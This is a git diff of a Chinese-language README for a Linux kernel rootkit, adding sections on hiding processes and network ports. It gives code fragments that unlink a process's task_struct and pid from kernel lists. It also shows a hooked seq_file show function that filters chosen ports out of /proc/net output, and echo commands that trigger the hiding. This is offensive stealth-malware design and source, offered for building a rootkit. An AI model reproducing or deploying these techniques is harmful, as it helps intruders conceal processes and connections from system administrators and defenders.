@@ -326,11 +326,254 @@ struct linux_dirent64 {
 
 ## 进程隐藏
 
+linux内核维护了task_struct和pid两个链表，分布记录了进程的task_struct结构和pid结构
 
+想要查看当前是否有rootkit进程有两个常规操作：
+- 遍历task_struct链表
+- 遍历/proc/pid中所有进程
+
+要想隐藏进程，就要考虑将rootkit相关的task struct和pid都摘除列表，即要从下面两点出发：
+
+- 脱离 task_struct 链表
+
+- 脱离 pid 链表
+
+那么首先看下linux中使用的相关的结构
+
+```c
+struct pid
+{
+	refcount_t count;
+	unsigned int level;
+	// lists of tasks that use this pid 
+	struct hlist_head tasks[PIDTYPE_MAX];
+	// wait queue for pidfd notifications 
+	wait_queue_head_t wait_pidfd;
+	struct rcu_head rcu;
+	struct upid numbers[1];
+};
+
+struct task_struct {
+    ......
+	struct pid			*thread_pid;
+	struct hlist_node		pid_links[PIDTYPE_MAX];//找task struct中的对应的pid hlist_node
+	struct list_head		thread_group;
+	struct list_head		thread_node;
+    ......
+    #endif // #ifdef CONFIG_TASKS_RCU 
+
+	struct sched_info		sched_info;
+
+	struct list_head		tasks; list_head 通过list_head将当前进程的task_struct串联进内核的进程列表中
+    .....
+    }
+
+struct list_head {
+struct list_head *next, *prev;
+};
+
+struct hlist_node {
+	struct hlist_node *next;
+	struct hlist_node **pprev;
+    //需要注意的是pprev是指针的指针,它指向的是前一个节点的next指针；其中首元素的pprev指向链表头的fist字段，末元素的next为NULL. 
+};
+```
+
+相关的函数
+
+```c
+struct task_struct *pid_task(struct pid *pid, enum pid_type type) //用于根据pid和其类型找到对应的task_struct
+find_vpid()//用于根据nr也就是namespace下的局部pid找到对应的struct pid结构体
+//使用的链表操作相关的函数
+list_add()//增加结点
+list_del()//删除结点
+hlist_add_head_rcu()//增加结点
+list_add_tail_rcu()  //增加结点
+list_del_rcu()//删除结点
+hlist_del_rcu()//删除结点
+INIT_HLIST_NODE()//初始化链表结点
+INIT_LIST_HEAD()//初始化链表头
+list_for_each_entry_safe()//相当于遍历整个双向循环链表,遍历时会存下下一个节点的数据结构,方便对当前项进行删除
+//内存操作
+kmalloc()//申请内存存储hide_node结构
+kfree()//释放hide_node结构占用的内存
+```
+
+自定义的数据结构
+
+```c
+//进程隐藏的存储链表
+static struct list_head hide_list_header=LIST_HEAD_INIT(hide_list_header);
+//进程隐藏的存储结点
+struct hide_node{
+	pid_t pid_victim_t;
+	struct task_struct* task_use_t;
+	struct list_head hide_list_header_t;
+};
+```
+
+使用的函数
+
+```c
+int hide_pid_fn(pid_t pid_victim);//隐藏进程
+int recover_pid_fn(pid_t pid_victim);//恢复隐藏的进程
+int recover_pid_all();//恢复所有进程
+```
+
+大致的流程：
+
+```c
+hide_pid_fn(pid_t pid_victim);
+```
+
+- 根据pid用find_vpid()找到对应的pid结构体
+
+- 成功找到pid结构体后利用pid_task()找到对应的task struct
+
+- 利用链表操作函数hlist_del_rcu对task struct 结点进行脱链，并用INIT_HLIST_NODE设置task struct 的前后指针
+
+- 然后根据task struct 找到对应的pid 的结点，利用hlist_del_rcu进行脱链，INIT_HLIST_NODE设置其指针为空，并将pprev指向自身。
+
+此时进程已经成功摘除链表被隐藏，但是需要记录对应结构，方便之后恢复
+
+- 用kmalloc申请一个hide_node类型结点的空间，设置对应的pid号和task struct指针，并通过list_head将其增加到hide_list_header 链表上进行记录
+
+到此完成隐藏进程功能，并未后面恢复做准备
+
+```c
+recover_pid_fn(pid_t pid_victim);
+```
+
+- 通过list_for_each_entry_safe来遍历hide_list_header链表，直到找到和pid对应的hide_node的进程。然后利用hlist_add_head_rcu将pid链入对应的pid链表，利用list_add_tail_rcu将task链入对应的task struct链表
+
+```c
+recover_pid_all(void);
+```
+
+- 这里同样通过list_for_each_entry_safe来遍历hide_list_header链表
+- 针对其中的每一个隐藏的进程，利用hlist_add_head_rcu将pid链入对应的pid链表，利用list_add_tail_rcu将task链入对应的task struct链表
 
 ## 端口隐藏
 
+>端口隐藏即隐藏已经被使用的端口，在linux中查看已经使用的端口有两个命令，一个是netstat，一个是ss，两个命令调用的系统调用不同，因此实际隐藏的过程也不同
 
+- netstat在读取端口信息时会读取以下四个文件（对应的网络协议为tcp、udp、tcp6、udp6）：/proc/net/tcp、/proc/net/udp、/proc/net/tcp6/、/proc/net/udp6
+- 这几个文件都是序列文件，即seq_file，seq_file定义的结构体如下
+
+```c
+struct seq_file {
+	char *buf; //缓冲区
+	size_t size;
+	size_t from;
+	size_t count; //缓冲区长度
+	size_t pad_until;
+	loff_t index;
+	loff_t read_pos;
+	u64 version;
+	struct mutex lock;
+	const struct seq_operations *op;  // important
+	int poll_event;
+	const struct file *file;
+	void *private;
+};
+```
+
+seq_operations定义的结构体为
+
+```c
+struct seq_operations {
+	void * (*start) (struct seq_file *m, loff_t *pos);
+	void (*stop) (struct seq_file *m, void *v);
+	void * (*next) (struct seq_file *m, void *v, loff_t *pos);
+	int (*show) (struct seq_file *m, void *v);
+};
+```
+
+seq_operations的show函数即为netstat要输出的信息，我们只需要将该函数的 hook掉，在hook之前需要先保存show函数的地址，对应的函数为set_seq_opeartions
+
+```c
+void set_seq_operations(const char* open_path,struct seq_operations** operations); // open_path是打开的序列文件，operations是要保存的show函数的真实地址
+```
+
+我们在全局变量中声明了一个链表，变量名为hidden_port_list_head，它的作用为存储需要被隐藏的端口的信息，当想隐藏端口时，调用**hide_connect**函数，它的定义为
+
+```c
+void hide_connect(int type, int port)
+```
+
+其中type为网络类型(tcp/udp/tcp6/udp6)，port为端口号，该函数会将需要隐藏的端口添加到链表上。
+
+```c
+    node = kmalloc(sizeof(struct port_node), GFP_KERNEL);
+    node->port = port;
+    node->type = type;
+
+    // 向链表中添加节点
+    list_add_tail(&node->list, &hidden_port_list_head);
+```
+
+当不想隐藏该端口时，使用**hide_unconnect**函数将该节点从链表中删除
+
+```c
+void unhide_connect(int type, int port){
+    list_for_each_entry_safe(entry, next_entry, &hidden_port_list_head, list){
+        if (entry->port == port && entry->type == type){
+            pr_info("Unhiding: %d", port);
+            list_del(&entry->list); // 将要隐藏的节点从链表中删除
+            kfree(entry);
+            return;
+        }
+    }
+}
+```
+
+隐藏端口的链表会在我们定义的hook函数中用到
+
+首先要让定义的hook函数的参数与需要被hook的函数参数相同
+
+```c
+int fake_seq_show(struct seq_file *seq, void *v)
+```
+
+hook函数首先判断网络类型，之后调用原show函数，如下
+
+```c
+    if (seq->op == tcp_operations){
+        type = TCP_CONNECT;
+        //调用原有的tcp show函数
+        ret = tcp_seq_fun(seq,v);
+    }
+    else if (seq->op == udp_operations){
+        type = UDP_CONNECT;
+        ret = udp_seq_fun(seq,v);
+    }
+    else if (seq->op == tcp6_operations){
+        type = TCP6_CONNECT;
+        ret = tcp6_seq_fun(seq,v);
+    }
+    else if (seq->op == udp6_operations){
+        type = UDP6_CONNECT;
+        ret = udp6_seq_fun(seq,v);
+    }
+```
+
+show函数会将需要展示的端口信息放在seq->buf中，而seq->count记录了buf的缓冲区长度，代码的逻辑为判断新增的缓冲区的字符串是否和想要的隐藏的端口信息相同，如下
+
+```c
+    // 对hidden_port_list_head遍历
+    list_for_each_entry(node, &hidden_port_list_head, list){
+        if (type == node->type){
+            // seq->buf为缓冲区,snprintf先按照缓冲区格式声明一个port_str_buf
+            snprintf(port_str_buf, PORT_STR_LEN, ":%04X", node->port);
+            // 之后将缓冲区的新增字符串和port_str_buf进行对比,如果对比成功,则说明这就是要过滤的端口号
+            if (strnstr(seq->buf + last_len, port_str_buf, this_len)){
+                pr_info("Hiding port: %d", node->port);
+                seq->count = last_len;
+                break;
+            }
+        }
+    }
+```
 
 ## 功能测试
 
@@ -368,14 +611,14 @@ echo hideprocess [PID] >/dev/null
 echo showprocess [PID] >/dev/null
 ```
 
-**文件隐藏与回复**
+文件隐藏与回复
 
 ```
 echo hidefile [filename] >/dev/null
 echo showfile [filename] >/dev/null
 ```
 
-**端口隐藏与回复**
+端口隐藏与回复
 
 ```
 echo hideport [port] >/dev/null
@@ -384,7 +627,7 @@ echo showport [port] >/dev/null
 
 # 参考资料
 
-- 攻击者Kernel Modules](http://www.ouah.org/LKM_HACKING.html)
+- [(nearly) Complete Linux Loadable Kernel Modules](http://www.ouah.org/LKM_HACKING.html)
 - [awesome-linux-rootkits](https://github.com/milabs/awesome-linux-rootkits)
 - [简易 Linux rootkit 编写入门指北](https://arttnba3.cn/2021/07/07/CODE-0X01-rootkit/)
 - [Reptile](https://github.com/f0rb1dd3n/Reptile)
